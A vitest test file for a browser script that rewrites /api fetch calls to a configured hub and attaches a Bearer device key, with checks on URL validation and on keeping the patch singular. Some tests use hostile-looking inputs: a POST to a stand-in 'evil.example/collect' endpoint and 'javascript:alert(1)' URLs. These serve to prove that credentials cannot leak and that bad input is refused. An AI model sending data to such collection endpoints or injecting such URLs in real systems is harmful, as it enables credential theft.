/**
 * SHELL-M2 — the client-side choke point that decides which hub we talk to.
 *
 * Two halves, and both are load-bearing:
 *
 *   1. BEHAVIOUR — the real shipped `static/hub-target.js` runs in a `node:vm`
 *      context with a stubbed localStorage + fetch (same technique as
 *      simple-mode.smoke.test.ts). The single most important assertion is the
 *      boring one: with no target configured, the patched fetch hands the
 *      ORIGINAL two arguments to the native fetch — identity-compared, not
 *      shape-compared. That is SHELL-M0 boundary ④ ("没装字节不变") expressed
 *      as a test rather than as a promise in a comment.
 *
 *   2. ANTI-CORROSION — a text-level scan of every hand-written client source
 *      asserting the choke point stayed singular. The failure this catches is
 *      the one the whole milestone exists to prevent: someone adds a 228th way
 *      to reach the hub, it works fine in the browser, and it silently points
 *      at the shell's own origin once the app ships.
 */

import { describe, expect, it } from 'vitest'
import { readFileSync, readdirSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { runInNewContext } from 'node:vm'

const HERE = dirname(fileURLToPath(import.meta.url))
const STATIC = join(HERE, '..', 'static')
const ADMIN_SRC = join(HERE, '..', 'admin-src')
const SRC = readFileSync(join(STATIC, 'hub-target.js'), 'utf8')

const STORE_KEY = 'gotong_hub_target'

interface Booted {
  hub: {
    base(): string
    userId(): string
    expiresAt(): number
    hubUrl(p: unknown): unknown
    setTarget(t: unknown): unknown
    clearTarget(): void
    normalizeHubBase(raw: unknown): string
  }
  fetch: (input: unknown, init?: unknown) => Promise<unknown>
  calls: Array<{ url: unknown; init: unknown }>
  stored(): string | null
}

/** Run the real file against a stub browser. `saved` seeds localStorage. */
function boot(saved?: unknown): Booted {
  const store = new Map<string, string>()
  if (saved !== undefined) {
    store.set(STORE_KEY, typeof saved === 'string' ? saved : JSON.stringify(saved))
  }
  const calls: Array<{ url: unknown; init: unknown }> = []
  const win: Record<string, unknown> = {
    fetch: (url: unknown, init: unknown) => {
      calls.push({ url, init })
      return Promise.resolve('ok')
    },
  }
  runInNewContext(SRC, {
    window: win,
    localStorage: {
      getItem: (k: string) => (store.has(k) ? store.get(k)! : null),
      setItem: (k: string, v: string) => void store.set(k, v),
      removeItem: (k: string) => void store.delete(k),
    },
    URL,
    Headers,
  })
  return {
    hub: win.GotongHub as Booted['hub'],
    fetch: win.fetch as Booted['fetch'],
    calls,
    stored: () => store.get(STORE_KEY) ?? null,
  }
}

const TARGET = { base: 'https://hub.example.org', key: 'aipk_secret', userId: 'u1', expiresAt: 42 }

describe('hub-target — 未配时逐字节今天', () => {
  it('把原样的两个参数交回原生 fetch（同一对象，不是等值副本）', async () => {
    const b = boot()
    const init = { method: 'POST', headers: { 'content-type': 'application/json' } }
    await b.fetch('/api/me/panel', init)
    expect(b.calls).toHaveLength(1)
    // 身份比较：连 init 都没被重新包一层，也就没有任何可漂移的余地。
    expect(b.calls[0]!.url).toBe('/api/me/panel')
    expect(b.calls[0]!.init).toBe(init)
  })

  it('hubUrl 原样返回，base() 为空', () => {
    const b = boot()
    expect(b.hub.base()).toBe('')
    expect(b.hub.hubUrl('/api/stream')).toBe('/api/stream')
  })

  it('盘上是坏数据时当作没配，而不是半信半疑地用', () => {
    for (const bad of [
      'not json at all',
      JSON.stringify({ base: 'http://hub.example.org' }), // 非回环明文
      JSON.stringify({ base: 'nonsense' }),
      JSON.stringify({ key: 'aipk_x' }), // 有 key 没地址
      JSON.stringify({ base: 'javascript:alert(1)' }),
    ]) {
      expect(boot(bad).hub.base()).toBe('')
    }
  })
})

describe('hub-target — normalizeHubBase', () => {
  const n = boot().hub.normalizeHubBase

  it('收下 https，并削掉 path/query/fragment', () => {
    expect(n('https://hub.example.org')).toBe('https://hub.example.org')
    expect(n('https://hub.example.org/x/y?q=1#z')).toBe('https://hub.example.org')
    expect(n('https://hub.example.org:8443')).toBe('https://hub.example.org:8443')
  })

  it('明文 http 只在回环上放行', () => {
    expect(n('http://localhost:3000')).toBe('http://localhost:3000')
    expect(n('http://127.0.0.1:3000')).toBe('http://127.0.0.1:3000')
    expect(n('http://127.9.9.9:3000')).toBe('http://127.9.9.9:3000')
    expect(n('http://app.localhost:3000')).toBe('http://app.localhost:3000')
    // 局域网明文会让设备 Bearer 一路裸奔 —— M7 的前置条件本就是域名 + TLS。
    expect(n('http://192.168.1.5:3000')).toBe('')
    expect(n('http://hub.example.org')).toBe('')
  })

  it('其余一律拒', () => {
    for (const bad of [
      '', 'hub.example.org', 'ftp://hub.example.org', 'javascript:alert(1)',
      'https://user:pw@hub.example.org', null, undefined, 42, {},
    ]) {
      expect(n(bad as unknown as string)).toBe('')
    }
  })
})

describe('hub-target — 配了目标之后', () => {
  it('/api/* 重写到目标 hub，带上 Bearer，且不让 cookie 跟车', async () => {
    const b = boot(TARGET)
    expect(b.hub.base()).toBe('https://hub.example.org')
    expect(b.hub.userId()).toBe('u1')
    expect(b.hub.expiresAt()).toBe(42)

    await b.fetch('/api/me/panel', { method: 'GET' })
    const c = b.calls[0]!
    expect(c.url).toBe('https://hub.example.org/api/me/panel')
    const init = c.init as { credentials: string; headers: Headers }
    expect(init.credentials).toBe('omit')
    expect(init.headers.get('authorization')).toBe('Bearer aipk_secret')
  })

  it('调用点自带的 Authorization 不被覆盖（补丁是兜底不是接管）', async () => {
    const b = boot(TARGET)
    await b.fetch('/api/me/panel', { headers: { authorization: 'Bearer caller' } })
    const init = b.calls[0]!.init as { headers: Headers }
    expect(init.headers.get('authorization')).toBe('Bearer caller')
  })

  it('非 /api 的根相对路径不重写 —— 壳里那些是本地资源', async () => {
    const b = boot(TARGET)
    const init = {}
    await b.fetch('/builtin-bundles/personal-growth.yaml', init)
    await b.fetch('/styles.css', init)
    expect(b.calls.map((c) => c.url)).toEqual([
      '/builtin-bundles/personal-growth.yaml',
      '/styles.css',
    ])
    // 原样放行也意味着连 init 都没换过。
    expect(b.calls[0]!.init).toBe(init)
  })

  it('绝对 URL 一律不碰，设备凭证因此结构性到不了第三方', async () => {
    const b = boot(TARGET)
    await b.fetch('https://evil.example/collect', { method: 'POST' })
    const c = b.calls[0]!
    expect(c.url).toBe('https://evil.example/collect')
    // 承重断言：这个请求上没有 Authorization 头可言。
    expect((c.init as { headers?: unknown }).headers).toBeUndefined()
  })

  it('hubUrl 是 EventSource 用的同一条规则', () => {
    const b = boot(TARGET)
    expect(b.hub.hubUrl('/api/stream')).toBe('https://hub.example.org/api/stream')
    expect(b.hub.hubUrl('/styles.css')).toBe('/styles.css')
  })
})

describe('hub-target — 写入口', () => {
  it('setTarget 落盘并即时生效', async () => {
    const b = boot()
    b.hub.setTarget({ base: 'https://hub.example.org/ignored/path', key: 'aipk_k', userId: 'u9', expiresAt: 7 })
    expect(b.hub.base()).toBe('https://hub.example.org')
    expect(JSON.parse(b.stored()!).base).toBe('https://hub.example.org')
    await b.fetch('/api/me/panel')
    expect(b.calls[0]!.url).toBe('https://hub.example.org/api/me/panel')
  })

  it('地址不合法当场抛，不静默忽略（配对失败要让成员看见）', () => {
    const b = boot()
    expect(() => b.hub.setTarget({ base: 'http://192.168.1.5:3000', key: 'k' })).toThrow(/not accepted/)
    expect(b.hub.base()).toBe('')
    expect(b.stored()).toBeNull()
  })

  it('clearTarget 回到同源行为', async () => {
    const b = boot(TARGET)
    b.hub.clearTarget()
    expect(b.hub.base()).toBe('')
    expect(b.stored()).toBeNull()
    const init = {}
    await b.fetch('/api/me/panel', init)
    expect(b.calls[0]!.url).toBe('/api/me/panel')
    expect(b.calls[0]!.init).toBe(init)
  })
})

// ---------------------------------------------------------------------------
// 防腐门 —— 咽喉必须保持唯一
// ---------------------------------------------------------------------------

/** 手写的客户端源码。static/admin.js 是 admin-src 的构建产物，扫源不扫产物。 */
function handWrittenSources(): Array<{ name: string; text: string }> {
  const out: Array<{ name: string; text: string }> = []
  for (const f of readdirSync(STATIC)) {
    if (!f.endsWith('.js') || f === 'admin.js' || f === 'hub-target.js') continue
    out.push({ name: `static/${f}`, text: readFileSync(join(STATIC, f), 'utf8') })
  }
  for (const f of readdirSync(ADMIN_SRC)) {
    if (!f.endsWith('.js')) continue
    out.push({ name: `admin-src/${f}`, text: readFileSync(join(ADMIN_SRC, f), 'utf8') })
  }
  return out
}

describe('hub-target — 防腐门', () => {
  it('扫到的手写源不是空集（门自己得活着）', () => {
    const files = handWrittenSources()
    expect(files.length).toBeGreaterThan(8)
    expect(files.map((f) => f.name)).toContain('static/app.js')
    expect(files.map((f) => f.name)).toContain('admin-src/main.js')
  })

  it('只有 hub-target.js 可以给 window.fetch 赋值', () => {
    for (const f of handWrittenSources()) {
      expect(f.text, `${f.name} 给 window.fetch 赋了值 —— 咽喉必须唯一`)
        .not.toMatch(/window\s*\.\s*fetch\s*=/)
    }
    expect(SRC).toMatch(/window\.fetch = function/)
  })

  it('只有 hub-target.js 知道存储键', () => {
    for (const f of handWrittenSources()) {
      expect(f.text, `${f.name} 直接读写了 ${STORE_KEY}`).not.toContain(STORE_KEY)
    }
  })

  it('每一处 EventSource 都必须经过 hubUrl —— fetch 补丁盖不到它', () => {
    for (const f of handWrittenSources()) {
      for (const m of f.text.matchAll(/new EventSource\(([^)]*)/g)) {
        expect(m[1], `${f.name} 的 EventSource 绕过了 hubUrl()`).toContain('hubUrl(')
      }
    }
    // 今天恰好只有一处，就是 app-core 的 /api/stream。数量本身不钉死（将来可以
    // 多，只要每一处都过咽喉），但至少得有一处，否则这条门在空集上永远绿。
    const total = handWrittenSources()
      .reduce((n, f) => n + [...f.text.matchAll(/new EventSource\(/g)].length, 0)
    expect(total).toBeGreaterThan(0)
  })

  it('app.html / worker.html 都在 app-core.js 之前加载 hub-target.js', () => {
    for (const page of ['app.html', 'worker.html']) {
      const html = readFileSync(join(STATIC, page), 'utf8')
      const hub = html.indexOf('/hub-target.js')
      const core = html.indexOf('/app-core.js')
      expect(hub, `${page} 没有加载 hub-target.js`).toBeGreaterThan(-1)
      expect(hub, `${page} 里 hub-target.js 排在 app-core.js 之后`).toBeLessThan(core)
    }
  })

  it('hub-target.js 进了 SW 预缓存（否则壳会拿到缺零件的旧缓存）', () => {
    const sw = readFileSync(join(STATIC, 'sw.js'), 'utf8')
    expect(sw).toContain("'/hub-target.js'")
  })
})
